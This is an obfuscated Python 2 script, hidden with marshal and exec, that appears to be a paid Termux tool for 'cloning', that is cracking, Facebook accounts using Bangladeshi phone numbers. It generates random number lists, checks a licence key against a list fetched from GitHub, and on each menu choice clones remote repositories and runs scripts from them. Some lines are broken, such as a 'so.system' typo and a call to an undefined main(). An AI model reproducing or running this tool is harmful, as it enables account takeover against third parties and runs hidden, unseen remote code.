import marshal
exec(marshal.loads(b's]\'\x00\x00#!/usr/bin/python \r\n# -*- coding: utf-8\r\nimport os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests, base64\r\nlogo = \'\\x1b\\33[93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \\n\\033[91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \\n\\33[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[96m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[0;35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\\033[0m\\n \\033[0m================================================================\\n\\33[93mAUTHOR :\\033[91m[MAHDI HASAN] SHUVO\\n\\033[0;33mGITHUB : \\033[1;97mhttps://github.com/MAHDI-Shuvo\\nLIVE in Sylhet (Read in class 10)\\n\\033[42mNo NEED GF \\033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU\\n ================================================================ \'\r\nlogo1 = """\r\n\\033[1;32m55.88b  d88. .d8b. db   db d8888b. d888888b\\n88\'YbdP`88 d8\' `8b 88   88 88  `8D   `88\'\\n88  88  88 88ooo88 88ooo88 88   88    88\\n88  88  88 88~~~88 88~~~88 88   88    88\\n88  88  88 88   88 88   88 88  .8D   .88.\\nYP  YP  YP YP   YP YP   YP Y8888D\' Y888888P                                             \r\n\\033[0m================================================================\\033[1;37m\r\nCREATED BY MAHDI HASAN(SHUVO)\\033[1;34m\r\nFB ; https://web.facebook.com/mahdihasan.80\\033[1;33m\r\nFB Grup ;https://web.facebook.com/group/\\033[0m\r\n"""\r\n\r\nos.system(\'clear\')\r\n\r\nprint 48 * \'\\x1b[1;91m~\'\r\ndef tik():\r\n    titik = [\'   \', \'.  \', \'.. \', \'...\', \'.. \', \'.  \', \'   \']\r\n    for o in titik:\r\n        print \'\\r\\x1b[1;91m [\\x1b[1;92m*\\x1b[1;91m]\\x1b[1;92m Wait A Few Moments \\x1b[1;93m\' + o,\r\n        sys.stdout.flush()\r\n        time.sleep(0.5)\r\n\r\nfuck = []\r\n\r\ndef jenw():\r\n    os.system(\'rm -rf .txt\')\r\n    os.system(\'clear\')\r\n    print logo1\r\n    print 48 * \'\\x1b[1;91m~\'\r\n    print \'\\x1b[1;91m [\\x1b[1;92m*\\x1b[1;91m]\\x1b[1;92m Set Phone Number Amount You Want To Clone\\n\\x1b[1;91m [\\x1b[1;92m*\\x1b[1;91m]\\x1b[1;92m Example:1000,2000,10000,20000\\n\'\r\n    walid = input(\'\\x1b[1;92m     Enter Amount\\x1b[1;93m\\xe2\\x80\\xa2\\xe2\\x9e\\xa2 \\x1b[1;96m\')\r\n    tik()\r\n    for n in range(walid):\r\n        nmbr = random.randint(1111111, 9999999)\r\n        sys.stdout = open(\'.txt\', \'a\')\r\n        print nmbr\r\n        sys.stdout.flush()\r\n\r\nimport uuid\r\ndef bnsbuy():\r\n    os.system(\'clear\')\r\n    print logo1\r\n    print \'\'\r\n    print \'\\x1b[1;92;1m Note: If Approval In Loading Or Show \\nNo Internet Connection,Then Connect USA Proxy \'\r\n    print \'\'\r\n    time.sleep(1)\r\n    try:\r\n        to = open(\'/data/data/com.termux/files/usr/etc/termuxopps\', \'r\').read()\r\n        bns = base64.b64decode(to)\r\n    except (KeyError, IOError):\r\n        bnsreg()\r\n    try:\r\n        l = \'https://raw.githubusercontent.com/Shuvo-BBHH/taxt/main/imt.txt\'        \r\n        r = requests.get(l).text\r\n    except requests.exceptions.ConnectionError:\r\n        print "\\x1b[0;31mNo Internet Connection"\r\n        exit()\r\n\r\n    if bns in r:\r\n        fuck.append(1)\r\n        main1()\r\n    else:\r\n        os.system(\'clear\')\r\n        print logo1\r\n        print \' \\x1b[1;96m\\tYour Id Is Not Approved \'\r\n        print\r\n        print \'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Do Not Press Enter If You Are A Free User\\x1b[0m\'\r\n        print\r\n        print \'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Your Key : \\x1b[101m\' + bns + \'\\x1b[0m\'\r\n        print\r\n        raw_input(\'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Press Enter To Buy This Tools \')\r\n        os.system(\'am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDI%20Paid%20Tools.%20My%20Key:%20\' + bns)\r\n        bnsbuy()\r\n\r\n\r\ndef bnsreg():\r\n    os.system(\'clear\')\r\n    print logo1\r\n    print \'\\t\\x1b[1;96m Key Not Approved \\x1b[0m\'\r\n    print\r\n    print \'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Note : This Tools Is Paid,So Pay First\'\r\n    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~MAHDI=="\r\n    print\r\n    print \'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Your Key: \\x1b[92m\\x1b[101m\' + id + \'\\x1b[0m\'\r\n    print \r\n    ben = base64.b64encode(id)\r\n    raw_input(\'\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m Press Enter To Buy This Tools\')\r\n    os.system(\'am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20\' + id)\r\n    sav = open(\'/data/data/com.termux/files/usr/etc/termuxopps\', \'w\')\r\n    sav.write(ben)\r\n    sav.close()\r\n    os.system("clear")\r\n    time.sleep(3)\r\n    print logo1\r\n    jalan("\\x1b[1;92mSent Your Key :\\x1b[1;92m \\x1b[1;92m" + id + "\\x1b[1;92m \\n\\x1b[1;92mTo Admin And Buy This Tools First \\n \\x1b[1;92mThen Run This Tools With \\x1b[1;93m python2 mahdi.py ")\r\n    exit()\r\ntry:\r\n    import mechanize\r\nexcept ImportError:\r\n    os.system(\'pip2 install request\')\r\n    time.sleep(1)\r\n\r\nimport os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize\r\nfrom multiprocessing.pool import ThreadPool\r\nfrom requests.exceptions import ConnectionError\r\nfrom mechanize import Browser\r\nreload(sys)\r\nsys.setdefaultencoding(\'utf8\')\r\nbr = mechanize.Browser()\r\nbr.set_handle_robots(False)\r\nbr.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)\r\nbr.addheaders = [(\'User-Agent\', \'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]\')]\r\nbr.addheaders = [(\'User-Agent\', \'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011;]\')]\r\nbr.addheaders = [(\'user-agent\', \'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]\')]\r\n\r\ndef jalan(z):\r\n\tfor e in z + \'\\n\':\r\n\t\tsys.stdout.write(e)\r\n\t\tsys.stdout.flush()\r\n\t\ttime.sleep(0.03)\r\n\r\nback = 0\r\noks = []\r\nid = []\r\ncpb = []\r\nvulnot = \'\\x1b[31mNot Vuln\'\r\nvuln = \'\\x1b[32mVuln\'\r\nos.system(\'clear\')\r\nprint\r\nprint logo1\r\nprint 47 * \'\\x1b[1;91m-\'\r\ndef lisensi():\r\n    os.system(\'clear\')\r\n    main1()\r\n\r\ndef main1():\r\n    if 1 in fuck:\r\n        os.system(\'#\')\r\n    else:\r\n        os.system("clear")\r\n        print "\\x1b[1;91mFuck Your Bypass System \xf0\x9f\x96\x95\xf0\x9f\x96\x95\xf0\x9f\x96\x95- Security By BNS Team"\r\n        exit()\r\n    os.system(\'clear\')\r\n    print logo\r\n    print 47 * \'\\x1b[1;91m-\'\r\n    print \'\\x1b[1;91m [\\x1b[1;92m1\\x1b[1;91m]\\x1b[1;92m Start CRACKING\'\r\n    time.sleep(0.05)\r\n    print \'\\x1b[1;91m [\\x1b[1;92m0\\x1b[1;91m]\\x1b[1;92m Back\'\r\n    pilih_login()\r\n\r\ndef pilih_login():\r\n    if 1 in fuck:\r\n        os.system(\'#\')\r\n    else:\r\n        os.system("clear")\r\n        print "\\x1b[1;91mFuck Your Bypass System \xf0\x9f\x96\x95\xf0\x9f\x96\x95\xf0\x9f\x96\x95- Security By BNS Team"\r\n        exit()\r\n    peak = raw_input("\\n\\x1b[1;91m [\\x1b[1;92m\xe2\x9c\x93\\x1b[1;91m]\\x1b[1;92m CHOOSE : \\x1b[1;92m")\r\n    if peak =="":\r\n        print "\\x1b[1;92mFill In Correctly"\r\n        pilih_login()\r\n    elif peak in ["1", "01"]:\r\n\r\n        print("""\\33[93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \\n\\033[91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \\n\\33[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[96m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[0;35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\\033[0m \r\n\\033[0m================================================================\r\n\\33[93mAUTHOR :\\033[91m[MAHDI HASAN] SHUVO\r\n\\033[0;33mGITHUB : \\033[1;97mhttps://github.com/====\r\n\\033[1;31mFb ; https://web.facebook.com/m.mahdi.80\r\n\\033[1;36mWHATAPP:01887408882\r\n\\033[1;33mLIVE in Sylhet (Read in class 10)\r\n\\033[42mNo NEED GF \\033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU \r\n\\033[0;36m================================================================""")\r\nprint("""\r\n\\033[1;36m[1]CLONE FROM  BANGLADESH 6DIG[All SIM]\r\n\\033[1;32m[2]CLONE FROM  BANGLADESH 7DIG[All SIM]\r\n\\033[1;88m[3]CLONE FROM  BANGLADESH 8DIG[All SIM]\r\n\\033[1;33m[4]CLONE FROM  BANGLADESH 11DIG[All SIM]\r\n\r\n""")\r\npil = input("\\033[1;97m[\\033[1;94m?\\033[1;97m] CHOOSE: ")\r\n\r\nif pil in ["01", "1"]:\r\n\r\n    os.system(\'git clone https://github.com/MAHDI-Shuvo/FAXALL && cd ALLdFAX\')\r\n    os.system(\'python2 b6.py\')\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\nelif pil in ["02", "2"]:\r\n    os.system(\'git clone https://github.com/MAHDI-Shuvo/FAXALL\')\r\n    os.system(\'cd FAXALL\')\r\n    os.system(\'python b7.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\n\r\n\r\nelif pil in ["03", "3"]:\r\n    os.system(\'git clone https://github.com/MAHDI-Shuvo/FAXALL\')\r\n    os.system(\'cd FAXALL\')\r\n    os.system(\'python2 b9.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["04", "4"]:\r\n    os.system(\'git clone https://github.com/MAHDI-Shuvo/FAXALL\')\r\n    os.system(\'cd FAXALL && python2 b11.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\n\r\n\r\nelif pil in ["05", "5"]:\r\n    so.system(\'git clone https://github.com/Shuvo-BBHH/mall\')\r\n    os.system(\'cd FAXALL && python ins.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n\r\n    print 47 * ("\\x1b[1;91m-")\r\n    raw_input("\\n\\x1b[1;93m Press Enter To Back")\r\n    main1()\r\n\r\n\r\nbnsbuy()'))
